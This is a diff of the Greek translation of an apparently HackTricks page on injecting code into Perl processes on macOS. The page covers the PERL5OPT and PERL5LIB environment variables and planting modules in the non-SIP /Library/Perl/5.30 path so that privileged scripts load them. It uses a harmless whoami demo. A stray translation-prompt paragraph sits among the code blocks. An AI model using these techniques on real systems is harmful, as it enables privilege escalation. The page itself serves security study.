@@ -1,6 +1,22 @@
-# Εισαγωγή κώδικα
+# macOS Εισαγωγή σε Εφαρμογές Perl
 
-Μέσω της μεταβλητής περιβάλλοντος PERL5OPT είναι δυνατή η εκτέλεση αυθαίρετων εντολών στην Perl.\
+<details>
+
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+Άλλοι τρόποι υποστήριξης του HackTricks:
+
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+
+</details>
+
+## Μέσω των μεταβλητών περιβάλλοντος `PERL5OPT` & `PERL5LIB`
+
+Χρησιμοποιώντας τη μεταβλητή περιβάλλοντος PERL5OPT είναι δυνατόν να κάνετε το perl να εκτελέσει αυθαίρετες εντολές.\
 Για παράδειγμα, δημιουργήστε αυτό το σενάριο:
 
 {% code title="test.pl" %}
@@ -10,7 +26,7 @@ print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Τώρα **εξαγάγετε τη μεταβλητή περιβάλλοντος** και εκτελέστε το **perl** script:
+Τώρα **εξαγάγετε τη μεταβλητή περιβάλλοντος** και εκτελέστε το **script perl**:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
@@ -32,11 +48,11 @@ PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
 ## Μέσω εξαρτήσεων
 
-Είναι δυνατόν να αναφέρουμε τη σειρά του φακέλου εξαρτήσεων της εκτέλεσης του Perl:
+Είναι δυνατόν να καταχωρηθεί η σειρά φακέλων εξαρτήσεων του Perl που εκτελείται:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-Το ακόλουθο είναι περιεχόμενο από ένα βιβλίο για χάκινγκ σχετικά με τεχνικές χάκινγκ. Το ακόλουθο περιεχόμενο είναι από το αρχείο /hive/hacktricks/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.md. Μεταφράστε το σχετικό αγγλικό κείμενο στα ελληνικά και επιστρέψτε τη μετάφραση διατηρώντας ακριβώς την ίδια σύνταξη markdown και html. Μην μεταφράζετε πράγματα όπως κώδικας, ονόματα τεχνικών χάκινγκ, χάκινγκ λέξεις, ονόματα cloud/SaaS πλατφορμών (όπως Workspace, aws, gcp...), η λέξη 'διαρροή', pentesting και ετικέτες markdown. Επίσης, μην προσθέτετε κανένα επιπλέον περιεχόμενο εκτός από τη μετάφραση και τη σύνταξη markdown.
+Το παρακάτω είναι περιεχόμενο από ένα βιβλίο για χάκινγκ σχετικά με τεχνικές χάκινγκ. Το παρακάτω περιεχόμενο είναι από το αρχείο macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.md.
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -48,30 +64,16 @@ perl -e 'print join("\n", @INC)'
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-Ορισμένοι από τους επιστρεφόμενους φακέλους δεν υπάρχουν καν, ωστόσο, το **`/Library/Perl/5.30`** υπάρχει, δεν είναι προστατευμένο από το **SIP** και βρίσκεται **πριν** από τους φακέλους που προστατεύονται από το SIP. Επομένως, κάποιος μπορεί να καταχραστεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε σενάρια Perl υψηλής προνομιούχου εκτέλεσης.
+Μερικοί από τους φακέλους που επιστράφηκαν δεν υπάρχουν καν, ωστόσο, το **`/Library/Perl/5.30`** υπάρχει, δεν προστατεύεται από το **SIP** και βρίσκεται πριν από τους φακέλους που προστατεύονται από το SIP. Συνεπώς, κάποιος θα μπορούσε να εκμεταλλευτεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε scripts ώστε ένα Perl script υψηλής προνομιακής πρόσβασης να τις φορτώσει.
 
 {% hint style="warning" %}
-Ωστόσο, σημειώστε ότι **χρειάζεστε δικαιώματα root για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτήν την **ειδοποίηση TCC**:
+Ωστόσο, σημειώστε ότι **χρειάζεστε root για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτό το **TCC prompt**:
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>
 
-Για παράδειγμα, αν ένα σενάριο εισάγει το **`use File::Basename;`**, θα ήταν δυνατόν να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελεστεί αυθαίρετος κώδικας.
+Για παράδειγμα, αν ένα script εισάγει **`use File::Basename;`** θα ήταν δυνατό να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελέσει αυθαίρετο κώδικα.
 
 ## Αναφορές
 
 * [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
-
-<details>
-
-<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.
-
-</details>
